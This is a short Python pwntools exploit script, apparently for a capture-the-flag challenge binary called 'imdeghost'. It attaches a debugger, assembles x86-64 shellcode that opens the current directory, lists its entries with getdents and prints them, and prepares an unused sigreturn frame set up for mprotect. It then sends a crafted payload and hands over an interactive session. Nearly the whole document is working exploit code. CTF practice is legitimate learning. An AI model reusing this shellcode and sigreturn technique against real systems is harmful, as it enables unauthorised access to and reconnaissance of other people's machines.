from pwn import * 
context.arch = "amd64"
p = process('./imdeghost')

pid = gdb.attach(p,gdbscript="""
	b * main + 196

	""")

sc= asm("""
	xor rax, rax
	push rax
	push 0x002e

	mov al, 2      
	mov rdi, rsp   
	xor rsi, rsi 
	xor rdx, rdx 
	syscall	

	mov rdi,rax 		
	xor rdx,rdx
	xor rax,rax
	mov dx, 0x3210 	
	sub rsp, rdx 	
	mov rsi, rsp 	
	mov al, 78 	
	syscall

	xchg rax,rdx

	xor rax, rax
	xor rdi,rdi
	
	inc eax
	inc edi
	mov rsi, rsp
	syscall


	xor rax, rax
	mov al, 60
	syscall
    

""",
arch='amd64',
os ='linux'
)


frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = 0
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = 0
frame.rip = 0
print 'asdasdsadsdsa',len(frame)

p.sendlineafter('again.\n',p64(0x13370000004b) + 'ABCDEF')

p.interactive()


